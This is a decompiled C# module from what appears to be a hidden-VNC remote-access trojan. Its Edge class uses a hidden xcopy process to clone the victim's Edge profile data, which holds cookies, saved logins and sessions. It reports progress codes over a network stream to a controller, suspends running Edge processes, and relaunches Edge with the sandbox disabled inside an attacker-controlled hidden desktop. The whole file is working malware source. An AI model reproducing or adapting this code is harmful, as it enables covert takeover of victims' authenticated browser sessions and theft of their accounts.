using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser
{
	// Token: 0x0200000A RID: 10
	public class Edge
	{
		// Token: 0x0600005B RID: 91
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x0600005C RID: 92 RVA: 0x00005320 File Offset: 0x00003520
		public static void StartEdge(bool duplicate)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Pandora\\lockfile"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Edge has already been opened!");
				}
				else
				{
					if (duplicate)
					{
						Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data") / 1024.0 / 1024.0)));
						try
						{
							if (!Directory.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Pandora"))
							{
								Process process = new Process();
								process.StartInfo.UseShellExecute = true;
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.CreateNoWindow = true;
								process.StartInfo.FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe");
								process.StartInfo.Arguments = string.Concat(new string[]
								{
									"\"",
									Interaction.Environ("localappdata"),
									"\\Microsoft\\Edge\\User Data\" \"",
									Interaction.Environ("localappdata"),
									"\\Microsoft\\Edge\\Pandora\" /E /I"
								});
								process.Start();
								process.WaitForExit();
							}
						}
						catch (Exception ex)
						{
						}
						Outils.SendInformation(Outils.nstream, "204|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data") / 1024.0 / 1024.0)));
					}
					else
					{
						Outils.SendInformation(Outils.nstream, "205|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data") / 1024.0 / 1024.0)));
					}
					Process[] processesByName = Process.GetProcessesByName("msedge");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.SuspendProcess(processesByName[i]);
					}
					Process.Start("msedge", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
					{
						Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
						Edge.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("msedge");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.ResumeProcess(processesByName[i]);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000045 RID: 69
		private const short SWP_NOMOVE = 2;

		// Token: 0x04000046 RID: 70
		private const short SWP_NOSIZE = 1;

		// Token: 0x04000047 RID: 71
		private const short SWP_NOZORDER = 4;

		// Token: 0x04000048 RID: 72
		private const int SWP_SHOWWINDOW = 64;
	}
}
